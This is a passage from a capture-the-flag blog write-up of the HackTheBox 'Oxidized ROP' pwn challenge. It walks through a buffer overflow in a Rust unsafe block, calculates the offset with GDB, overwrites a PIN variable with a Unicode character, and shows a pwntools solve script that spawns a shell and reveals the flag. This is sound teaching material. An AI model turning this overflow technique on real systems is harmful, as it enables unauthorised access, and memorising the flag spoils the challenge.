+<span class="mtk1">            dest_ptr </span><span class="mtk5">=</span><span class="mtk1"> dest_ptr</span><span class="mtk5">.</span><span class="mtk8">offset</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Here we have a suspicious <code>unsafe</code> block. Rust is known to be a memory-safe language, unless you use <code>unsafe</code>. Therefore, this is the place where the vulnerability might appear. In fact, <code>read_user_input</code> behaves like a <code>gets</code> function, and the data received is stored into <code>feedback.statement</code> no matter the size of the reserved buffer. Therefore, we have a Buffer Overflow vulnerability.</p><h2 id="exploit-strategy">Exploit strategy</h2><p>Let&rsquo;s use GDB to see how the memory is setup right after entering user input (<code>ABCD</code> for testing):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">oxidized-rop</span>
+Reading symbols from <span class="code-dark-green">oxidized-rop</span>...
+<span class="code-red">gef➤  </span>run
+Starting program: ./oxidized-rop
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "<span class="code-dark-green">/lib/x86_64-linux-gnu/libthread_db.so.1</span>".
+--------------------------------------------------------------------------
+  ______   _______ _____ _____ ____________ _____    _____   ____  _____
+ / __ \ \ / /_   _|  __ \_   _|___  /  ____|  __ \  |  __ \ / __ \|  __ \
+| |  | \ V /  | | | |  | || |    / /| |__  | |  | | | |__) | |  | | |__) |
+| |  | |&gt; &lt;   | | | |  | || |   / / |  __| | |  | | |  _  /| |  | |  ___/
+| |__| / . \ _| |_| |__| || |_ / /__| |____| |__| | | | \ \| |__| | |
+ \____/_/ \_\_____|_____/_____/_____|______|_____/  |_|  \_\\____/|_|
+
+Rapid Oxidization Protection -------------------------------- by christoss
+
+
+Welcome to the Rapid Oxidization Protection Survey Portal!
+(If you have been sent by someone to complete the survey, select option 1)
+
+1. Complete Survey
+2. Config Panel
+3. Exit
+Selection: 1
+
+
+Hello, our workshop is experiencing rapid oxidization. As we value health and
+safety at the workspace above all we hired a ROP (Rapid Oxidization Protection)
+service to ensure the structural safety of the workshop. They would like a quick
+statement about the state of the workshop by each member of the team. This is
+completely confidential. Each response will be associated with a random number
+in no way related to you.
+
+Statement (max 200 characters): ABCD
+
+--------------------------------------------------------------------------
+Thanks for your statement! We will try to resolve the issues ASAP!
+Please now exit the program.
+--------------------------------------------------------------------------
+
+
+Welcome to the Rapid Oxidization Protection Survey Portal!
+(If you have been sent by someone to complete the survey, select option 1)
+
+1. Complete Survey
+2. Config Panel
+3. Exit
+Selection: ^C
+Program received signal SIGINT, Interrupt.
+<span class="code-dark-blue">0x00007ffff7f94392</span> in <span class="code-dark-yellow">__libc_read</span> (<span class="code-dark-cyan">fd</span>=0x0, <span class="code-dark-cyan">buf</span>=0x5555555bcad0, <span class="code-dark-cyan">nbytes</span>=0x2000) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26  
+26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
+</code></pre></div><p>Let&rsquo;s see where we have the default <code>login_pin</code> and examine the memory a few addresses above:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>grep 0x11223344
+<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">\x44\x33\x22\x11</span>' in memory
+<span class="code-green">[+]</span> In '<span class="code-dark-blue">./oxidized-rop</span>'(0x55555555b000-0x5555555a4000), permission=r-x  
+  0x555555560b86 - 0x555555560b96  →   "<span class="code-dark-magenta">\x44\x33\x22\x11[...]</span>"
+<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-
+  0x7fffffffe4d8 - 0x7fffffffe4e8  →   "<span class="code-dark-magenta">\x44\x33\x22\x11[...]</span>"
+<span class="code-green">gef➤  </span>x/60gx 0x7fffffffe300
+<span class="code-dark-blue">0x7fffffffe300</span>: 0x00005555555bb048      0x0000000000000001
+<span class="code-dark-blue">0x7fffffffe310</span>: 0x00005555555a40e0      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe320</span>: 0x00005555555bb080      0x0000555555560b94
+<span class="code-dark-blue">0x7fffffffe330</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe340</span>: 0x0000004200000041      0x0000004400000043
+<span class="code-dark-blue">0x7fffffffe350</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe360</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe370</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe380</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe390</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe3a0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe3b0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe3c0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe3d0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe3e0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe3f0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe400</span>: 0x0000000000000000      0x0000000000020501
+<span class="code-dark-blue">0x7fffffffe410</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe420</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe430</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe440</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe450</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe460</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe470</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe480</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe490</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe4a0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe4b0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe4c0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe4d0</span>: 0x0000000000000000      0x0000000011223344
+</code></pre></div><p>Curiously, we don&rsquo;t see <code>ABCD</code> as <code>44434241</code>. Instead, each character has a length of 4 bytes. This is quite interesting.</p><p>For the moment, let&rsquo;s calculate how many characters we need to overwrite the default value of <code>login_pin</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>p/d (0x7fffffffe4d8 - 0x7fffffffe340) / 4  
+$d = 102
+</code></pre></div><p>That is, if we enter exactly 102 characters, then the next one will overwrite the default value of <code>login_pin</code>. Let&rsquo;s test it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>shell python3 -c 'print("A" * 102 + "B")'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
+<span class="code-green">gef➤  </span>run
+Starting program: ./oxidized-rop
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "<span class="code-dark-green">/lib/x86_64-linux-gnu/libthread_db.so.1</span>".
+--------------------------------------------------------------------------
+  ______   _______ _____ _____ ____________ _____    _____   ____  _____
+ / __ \ \ / /_   _|  __ \_   _|___  /  ____|  __ \  |  __ \ / __ \|  __ \
+| |  | \ V /  | | | |  | || |    / /| |__  | |  | | | |__) | |  | | |__) |
+| |  | |&gt; &lt;   | | | |  | || |   / / |  __| | |  | | |  _  /| |  | |  ___/
+| |__| / . \ _| |_| |__| || |_ / /__| |____| |__| | | | \ \| |__| | |
+ \____/_/ \_\_____|_____/_____/_____|______|_____/  |_|  \_\\____/|_|
+
+Rapid Oxidization Protection -------------------------------- by christoss
+
+
+Welcome to the Rapid Oxidization Protection Survey Portal!
+(If you have been sent by someone to complete the survey, select option 1)
+
+1. Complete Survey
+2. Config Panel
+3. Exit
+Selection: 1
+
+
+Hello, our workshop is experiencing rapid oxidization. As we value health and
+safety at the workspace above all we hired a ROP (Rapid Oxidization Protection)
+service to ensure the structural safety of the workshop. They would like a quick
+statement about the state of the workshop by each member of the team. This is
+completely confidential. Each response will be associated with a random number
+in no way related to you.
+
+Statement (max 200 characters): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB  
+
+--------------------------------------------------------------------------
+Thanks for your statement! We will try to resolve the issues ASAP!
+Please now exit the program.
+--------------------------------------------------------------------------
+
+
+Welcome to the Rapid Oxidization Protection Survey Portal!
+(If you have been sent by someone to complete the survey, select option 1)
+
+1. Complete Survey
+2. Config Panel
+3. Exit
+Selection: ^C
+Program received signal SIGINT, Interrupt.
+<span class="code-dark-blue">0x00007ffff7f94392</span> in <span class="code-dark-yellow">__libc_read</span> (<span class="code-dark-cyan">fd</span>=0x0, <span class="code-dark-cyan">buf</span>=0x5555555bcad0, <span class="code-dark-cyan">nbytes</span>=0x2000) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26
+26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/60gx 0x7fffffffe300
+<span class="code-dark-blue">0x7fffffffe300</span>: 0x00005555555bb048      0x0000000000000001  
+<span class="code-dark-blue">0x7fffffffe310</span>: 0x00005555555a40e0      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe320</span>: 0x00005555555bb080      0x0000555555560b94
+<span class="code-dark-blue">0x7fffffffe330</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe340</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe350</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe360</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe370</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe380</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe390</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe3a0</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe3b0</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe3c0</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe3d0</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe3e0</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe3f0</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe400</span>: 0x0000004100000041      0x0000004100000001
+<span class="code-dark-blue">0x7fffffffe410</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe420</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe430</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe440</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe450</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe460</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe470</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe480</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe490</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe4a0</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe4b0</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe4c0</span>: 0x0000004100000041      0x0000004100000041
+<span class="code-dark-blue">0x7fffffffe4d0</span>: 0x0000004100000041      0x0000000000000042
+</code></pre></div><p>There it is, the <code>B</code> (<code>42</code> in hexadecimal) is where the default value of <code>login_pin</code> was located before.</p><h3 id="unicode-characters">Unicode characters</h3><p>At this point, I remembered that Rust supports Unicode characters. This came to my mind because most Rust projects use Unicode characters to improve the visual experience (for instance, <a target="_blank" href="https://github.com/epi052/feroxbuster">feroxbuster</a>, <a target="_blank" href="https://github.com/RustScan/RustScan">RustScan</a>, <a target="_blank" href="https://github.com/lsd-rs/lsd">lsd</a> or <a target="_blank" href="https://github.com/sharkdp/bat">bat</a>). The documentation for this feature is available <a target="_blank" href="https://doc.rust-lang.org/std/primitive.char.html">here</a>.</p><p>Therefore, instead of using normal ASCII characters to modify the default value of <code>login_pin</code>, we will use Unicode characters to have a wider range of action and enter the Unicode character associated to <code>123456</code> (which is the pin we need to get a shell).</p><p>To know exactly the value we need to write into memory, we can use Python to see the bytes representation:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+&gt;&gt;&gt; chr(123456).encode()  
+b'\xf0\x9e\x89\x80'
+</code></pre></div><p>This is the value we need to use (or simply <code>chr(123456).encode()</code>).</p><h2 id="exploit-development">Exploit development</h2><p>This is the exploit (very simple):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
+
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">102</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">chr</span><span class="mtk1">(</span><span class="mtk6">123456</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">()</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Selection: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Statement (max 200 characters): '</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>  
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Selection: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
+</code></pre></div><p>If we run it locally, we have a shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './oxidized-rop'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-red">No canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+[<span class="code-green">+</span>] Starting local process './oxidized-rop': pid 3412329  
+[<span class="code-blue">*</span>] Switching to interactive mode
+<span class="code-red">$</span> ls
+oxidized-rop  oxidized-rop.rs  solve.py
+</code></pre></div><h2 id="flag">Flag</h2><p>Let&rsquo;s try on the remote instance:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 138.68.139.152:32345
+[<span class="code-blue">*</span>] './oxidized-rop'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-red">No canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+[<span class="code-green">+</span>] Opening connection to 138.68.139.152 on port 32345: Done  
+[<span class="code-blue">*</span>] Switching to interactive mode
+<span class="code-red">$</span> ls
+bin
+boot
+dev
+etc
+flag.txt
+home
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+oxidized-rop
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+<span class="code-red">$</span> cat flag.txt
+HTB{7h3_0r4n63_cr4b_15_74k1n6_0v3r!}
+</code></pre></div><p>The full exploit script can be found in here: <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Oxidized%20ROP/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#source-code-analysis">Source code analysis</a><ul><li><a href="#buffer-overflow-vulnerability">Buffer Overflow vulnerability</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a><ul><li><a href="#unicode-characters">Unicode characters</a></li></ul></li><li><a href="#exploit-development">Exploit development</a></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
